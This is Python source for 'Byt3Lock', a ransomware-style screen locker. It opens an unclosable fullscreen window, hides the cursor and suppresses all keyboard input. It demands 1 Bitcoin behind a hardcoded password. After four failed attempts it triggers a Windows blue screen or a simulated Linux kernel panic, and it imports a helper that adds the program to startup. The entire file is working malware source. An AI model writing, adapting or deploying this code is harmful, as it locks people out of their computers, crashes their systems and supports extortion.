#!/usr/bin/env python
# -*- coding: utf-8 -*-

from tkinter import *
import tkinter.messagebox as messagebox
from functools import partial
import os
import sys
import keyboard
from modules import bsod, uninstall, simulate_kernel_panic, add_to_startup, remove_from_startup, get_os

# Global Variables
os_type = get_os()
file_path = os.path.abspath(sys.argv[0])
password = "123"
count = 4
lock_text = "hacked by 0xbassiouny_!337"

# Function to handle button clicks
def button_click(arg):
    enter_pass.insert(END, arg)

# Function to delete the last character in the password input field
def delete_last_char():
    enter_pass.delete(-1, END)

# Function to check the password and unlock the program
def check_password():
    global count
    if enter_pass.get() == password:
        messagebox.showinfo("Byt3Lock", "UNLOCKED SUCCESSFULLY")
        uninstall(lock)
    else:
        count -= 1
        if count == 0:
            messagebox.showwarning("Byt3Lock", "Number of attempts expired")
            if os_type == "Windows":
                bsod()
            elif os_type == "Linux":
                simulate_kernel_panic()
            else:
                messagebox.showerror("Byt3Lock", "Unsupported OS")
        else:
            messagebox.showwarning("Byt3Lock", f"Wrong password. Available tries: {count}")

# Function to handle program exit
def on_exit():
    messagebox.showwarning("Byt3Lock", "DEATH IS INEVITABLE")


# Create the main window
lock = Tk()
lock.title("Byt3Lock")
lock.configure(bg="black")

# Create labels with a sinister hacker theme
Label(lock, bg="black", fg="red", text="> SYSTEM LOCKED By Byt3Lock<", font=("Courier", 40)).pack(pady=20)
Label(lock, bg="black", fg="red", text="Pay 1 Bitcoin to unlock.", font=("Courier", 20)).pack()
Label(lock, bg="black", fg="green", text=lock_text, font=("Courier", 18)).pack()

# Set up keyboard event handling
keyboard.on_press(lambda e: None, suppress=True)  # Suppress keyboard events

# Create password input field
enter_pass = Entry(lock, bg="black", fg="green", text="", font=("Courier", 24), show="*")
enter_pass.pack(pady=20)
lock.resizable(0, 0)

# Create buttons with a hacker theme
button_labels = ['7', '8', '9', '4', '5', '6', '1', '2', '3', '0']
button_frame = Frame(lock, bg="black")
button_frame.pack()

for label in button_labels:
    Button(button_frame, text=label, padx="20", pady="20", bg='black', fg='green', font=("Courier", 18), command=partial(button_click, label)).pack(side=LEFT, padx=5, pady=5)

# Create the "Unlock" button with a sinister appearance
unlock_button = Button(lock, text='Unlock', padx="10", pady="5", bg='red', fg='black', font=("Courier", 16), command=check_password)
unlock_button.pack(pady=10)

# Set the exit behavior
lock.protocol("WM_DELETE_WINDOW", on_exit)

# Hide the mouse cursor
lock.config(cursor="none")

# Make the window fullscreen
lock.attributes('-fullscreen', True)

# Start the GUI event loop
lock.mainloop()
